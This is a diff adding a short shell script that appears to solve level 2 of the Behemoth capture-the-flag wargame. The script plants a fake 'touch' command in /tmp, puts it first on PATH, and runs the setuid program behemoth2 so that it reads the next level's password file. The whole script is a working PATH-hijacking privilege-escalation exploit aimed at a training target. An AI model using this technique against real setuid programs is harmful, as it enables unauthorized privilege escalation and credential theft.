@@ -1,0 +1,6 @@
+mkdir /tmp/sploitem
+cd /tmp/sploitem
+echo "/bin/cat /etc/behemoth_pass/behemoth3" > touch
+chmod +x touch
+PATH=/tmp/sploitem:$PATH
+/behemoth/behemoth2
